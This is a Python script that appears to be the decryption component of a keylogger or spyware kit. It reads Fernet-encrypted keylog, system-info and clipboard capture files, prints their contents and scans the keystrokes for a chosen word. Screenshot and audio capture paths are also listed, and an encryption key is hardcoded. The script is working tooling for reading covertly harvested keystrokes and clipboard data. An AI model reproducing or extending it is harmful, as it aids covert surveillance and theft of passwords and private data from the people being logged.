from cryptography.fernet import Fernet

# File paths
keylog_file_path = r'D:\key\stroker\keylog_encrypted.txt'
sys_file_path = r'D:\key\stroker\systeminfo_encrypted.txt'
clipboard_file_path = r'D:\key\stroker\clipboard_encrypted.txt'
screenshot_file_path = r'D:\key\stroker\screenshot_encrypted.png'
audio_file_path = r'D:\key\stroker\audio_encrypted.wav'

# Load the encryption key
key = b'T3Xt6h9CTuNhCC2WSHy1UASL7KG2oO-8xlaoCDwi9U0='  # Replace with the actual encryption key

# Create a cipher suite using the key
cipher_suite = Fernet(key)

forbidden_word = "email"  # Replace with your forbidden word


def decrypt_keylog_file():
    try:
        with open(keylog_file_path, 'rb') as file:
            encrypted_content = file.read()
            decrypted_content = cipher_suite.decrypt(encrypted_content).decode('utf-8')
            print("Decrypted Keylog Content:")
            print(decrypted_content)

            # Track keystrokes until forbidden word is detected
            typed_text = ""
            for char in decrypted_content:
                typed_text += char
                if forbidden_word in typed_text.lower():
                    print("Forbidden word detected:", forbidden_word)
                    break
            
    except FileNotFoundError:
        print("Keylog file not found at:", keylog_file_path)
    except Exception as e:
        print("Error during decryption:", str(e))


def decrypt_sys_file():
    try:
        with open(sys_file_path, 'rb') as file:
            encrypted_content = file.read()
            decrypted_content = cipher_suite.decrypt(encrypted_content).decode('utf-8')
            print("Decrypted sysinfo Content:")
            print(decrypted_content)
    except FileNotFoundError:
        print("System info file not found at:", sys_file_path)
    except Exception as e:
        print("Error during decryption:", str(e))


def decrypt_clipboard():
    try:
        with open(clipboard_file_path, 'rb') as file:
            encrypted_content = file.read()
            decrypted_content = cipher_suite.decrypt(encrypted_content).decode('utf-8')
            print("Decrypted Clipboard Content:")
            print(decrypted_content)
    except FileNotFoundError:
        print("Clipboard file not found at:", clipboard_file_path)
    except Exception as e:
        print("Error during decryption:", str(e))


# Call the decryption functions
decrypt_keylog_file()
decrypt_sys_file()
decrypt_clipboard()
